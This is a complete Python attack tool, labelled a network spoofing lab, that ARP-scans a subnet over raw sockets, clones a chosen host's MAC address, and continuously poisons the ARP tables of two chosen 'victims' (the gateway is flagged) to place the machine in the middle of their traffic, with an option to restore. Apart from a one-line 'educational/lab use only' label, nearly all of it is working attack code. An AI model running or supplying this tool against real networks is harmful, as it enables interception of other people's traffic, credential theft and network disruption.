#!/usr/bin/env python3
"""
Network Spoofing Lab Tool (Manual Version - raw socket + struct + fast scan)

Features:
- MAC Spoofing: change Kali's MAC to that of a detected victim
- ARP Spoofing: poison ARP tables between 2 chosen victims
- Restore: restore permanent MAC and correct ARP tables
- Quit: exit program

Author: For educational/lab use only
"""

import os, sys, time, struct, socket, subprocess

# ==============================
# GLOBAL STATE
# ==============================
spoofed_mac = None
interface = None
arp_targets = {}   # store victims for restore


# ==============================
# HELPER FUNCTIONS
# ==============================
def mac_to_bytes(mac_str):
    """Convert MAC string '00:11:22:33:44:55' -> bytes"""
    return bytes.fromhex(mac_str.replace(":", ""))


def bytes_to_mac(b):
    """Convert bytes -> MAC string '00:11:22:33:44:55'"""
    return ":".join(f"{x:02x}" for x in b)


def get_perm_mac(iface):
    """Return permanent MAC of interface using ethtool"""
    try:
        result = subprocess.check_output(f"ethtool -P {iface}", shell=True).decode()
        return result.strip().split()[-1]
    except Exception:
        return None


def get_mac_linux(iface):
    """Return current MAC address of interface"""
    with open(f"/sys/class/net/{iface}/address") as f:
        return f.read().strip()


def change_mac(iface, new_mac):
    """Change interface MAC to new_mac"""
    global spoofed_mac
    os.system(f"sudo ip link set {iface} down")
    os.system(f"sudo ip link set {iface} address {new_mac}")
    os.system(f"sudo ip link set {iface} up")
    spoofed_mac = new_mac
    print(f"[*] MAC of {iface} changed to {new_mac}")


def restore_mac(iface):
    """Restore permanent MAC of interface"""
    global spoofed_mac
    perm_mac = get_perm_mac(iface)
    if not perm_mac:
        print("[!] Could not detect permanent MAC")
        return
    os.system(f"sudo ip link set {iface} down")
    os.system(f"sudo ip link set {iface} address {perm_mac}")
    os.system(f"sudo ip link set {iface} up")
    spoofed_mac = None
    print(f"[+] MAC of {iface} restored to {perm_mac}")


def craft_arp_request(src_mac, src_ip, target_ip):
    """Build ARP Request packet"""
    src_ip_bin = socket.inet_aton(src_ip)
    target_ip_bin = socket.inet_aton(target_ip)

    arp_request = struct.pack("!HHBBH6s4s6s4s",
                              1, 0x0800, 6, 4, 1,
                              src_mac, src_ip_bin,
                              b"\x00"*6, target_ip_bin)

    eth_header = struct.pack("!6s6sH", b"\xff"*6, src_mac, 0x0806)
    return eth_header + arp_request


def craft_arp_reply(src_ip, src_mac, dst_ip, dst_mac):
    """Build ARP Reply packet"""
    src_ip_bin = socket.inet_aton(src_ip)
    dst_ip_bin = socket.inet_aton(dst_ip)

    arp_payload = struct.pack("!HHBBH6s4s6s4s",
                              1, 0x0800, 6, 4, 2,
                              src_mac, src_ip_bin,
                              dst_mac, dst_ip_bin)

    eth_header = struct.pack("!6s6sH", dst_mac, src_mac, 0x0806)
    return eth_header + arp_payload


def get_gateway():
    """Return default gateway IP"""
    try:
        result = subprocess.check_output("ip route show default", shell=True).decode()
        gw_ip = result.split()[2]
        return gw_ip
    except Exception:
        return None


def fast_scan_network(iface, subnet):
    """
    Fast ARP scan: send all requests, then capture replies for 2s.
    Returns list of (ip, mac).
    """
    attacker_mac = mac_to_bytes(get_mac_linux(iface))
    attacker_ip = subprocess.check_output(
        f"ip -4 addr show {iface} | grep inet", shell=True
    ).decode().split()[1].split("/")[0]

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind((iface, 0))
    sock.settimeout(2)

    base = ".".join(subnet.split(".")[:3])
    targets = [f"{base}.{i}" for i in range(1, 255)]

    # Send ARP requests
    for ip in targets:
        if ip == attacker_ip:
            continue
        pkt = craft_arp_request(attacker_mac, attacker_ip, ip)
        sock.send(pkt)

    # Listen for replies
    hosts = []
    start = time.time()
    while time.time() - start < 2:
        try:
            data = sock.recv(65535)
            if struct.unpack("!H", data[12:14])[0] == 0x0806:
                arp = data[14:42]
                opcode = struct.unpack("!HHBBH6s4s6s4s", arp)[4]
                sender_mac = struct.unpack("!HHBBH6s4s6s4s", arp)[5]
                sender_ip = socket.inet_ntoa(struct.unpack("!HHBBH6s4s6s4s", arp)[6])
                if opcode == 2:
                    hosts.append((sender_ip, bytes_to_mac(sender_mac)))
        except socket.timeout:
            break

    sock.close()
    return list(set(hosts))


def arp_spoof(v1_ip, v1_mac, v2_ip, v2_mac, iface):
    """ARP spoof between 2 victims"""
    global spoofed_mac, arp_targets
    attacker_mac = mac_to_bytes(spoofed_mac) if spoofed_mac else mac_to_bytes(get_mac_linux(iface))

    v1_mac_b = mac_to_bytes(v1_mac)
    v2_mac_b = mac_to_bytes(v2_mac)

    pkt1 = craft_arp_reply(v2_ip, attacker_mac, v1_ip, v1_mac_b)
    pkt2 = craft_arp_reply(v1_ip, attacker_mac, v2_ip, v2_mac_b)

    arp_targets = {v1_ip: v1_mac_b, v2_ip: v2_mac_b}

    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    raw_socket.bind((iface, 0))

    print(f"[*] Attacker MAC = {bytes_to_mac(attacker_mac)}")
    print("[*] Starting ARP spoofing... CTRL+C to stop")

    try:
        while True:
            raw_socket.send(pkt1)
            raw_socket.send(pkt2)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopped ARP spoofing. Use option 3 to restore ARP tables.")
    finally:
        raw_socket.close()


def restore_arp(v1_ip, v1_mac, v2_ip, v2_mac, iface):
    """Send correct ARP replies to restore victims' ARP tables"""
    v1_mac_b = mac_to_bytes(v1_mac)
    v2_mac_b = mac_to_bytes(v2_mac)

    pkt1 = craft_arp_reply(v2_ip, v2_mac_b, v1_ip, v1_mac_b)
    pkt2 = craft_arp_reply(v1_ip, v1_mac_b, v2_ip, v2_mac_b)

    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    raw_socket.bind((iface, 0))

    for _ in range(5):
        raw_socket.send(pkt1)
        raw_socket.send(pkt2)
        time.sleep(0.5)
    raw_socket.close()
    print("[+] ARP tables restored")


# ==============================
# MAIN MENU
# ==============================
def menu():
    global interface
    while True:
        print("\n===== NETWORK SPOOF LAB (Manual Fast) =====")
        print("1. MAC Spoofing")
        print("2. ARP Spoofing")
        print("3. Restore (MAC + ARP)")
        print("4. Quit")

        choice = input("Select option: ").strip()

        if choice == "1":
            iface = input("Enter interface (e.g., eth1): ").strip()
            subnet = input("Enter subnet (e.g., 192.168.48.0/24): ").strip()
            hosts = fast_scan_network(iface, subnet)
            gateway_ip = get_gateway()

            if not hosts:
                print("[!] No hosts found")
                continue

            print("\nDetected hosts:")
            for i, (ip, mac) in enumerate(hosts, 1):
                tag = " [GATEWAY]" if gateway_ip and ip == gateway_ip else ""
                print(f"[{i}] {ip}\t{mac}{tag}")

            sel = int(input("Choose target number to spoof: "))
            target_ip, target_mac = hosts[sel - 1]

            change_mac(iface, target_mac)
            interface = iface

        elif choice == "2":
            if not interface:
                interface = input("Enter interface (e.g., eth1): ").strip()
            subnet = input("Enter subnet (e.g., 192.168.48.0/24): ").strip()
            hosts = fast_scan_network(interface, subnet)
            gateway_ip = get_gateway()

            if len(hosts) < 2:
                print("[!] Need at least 2 victims")
                continue

            print("\nDetected hosts:")
            for i, (ip, mac) in enumerate(hosts, 1):
                tag = " [GATEWAY]" if gateway_ip and ip == gateway_ip else ""
                print(f"[{i}] {ip}\t{mac}{tag}")

            sel1 = int(input("Choose Victim 1: "))
            sel2 = int(input("Choose Victim 2: "))
            v1_ip, v1_mac = hosts[sel1 - 1]
            v2_ip, v2_mac = hosts[sel2 - 1]

            arp_spoof(v1_ip, v1_mac, v2_ip, v2_mac, interface)

        elif choice == "3":
            if interface and len(arp_targets) == 2:
                v1, v2 = list(arp_targets.keys())
                restore_mac(interface)
                restore_arp(v1, bytes_to_mac(arp_targets[v1]), v2, bytes_to_mac(arp_targets[v2]), interface)
            else:
                print("[!] No spoofing data available")

        elif choice == "4":
            print("[*] Exiting...")
            break
        else:
            print("[!] Invalid choice")


# ==============================
# ENTRY POINT
# ==============================
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Must run as root (sudo)")
        sys.exit(1)
    menu()

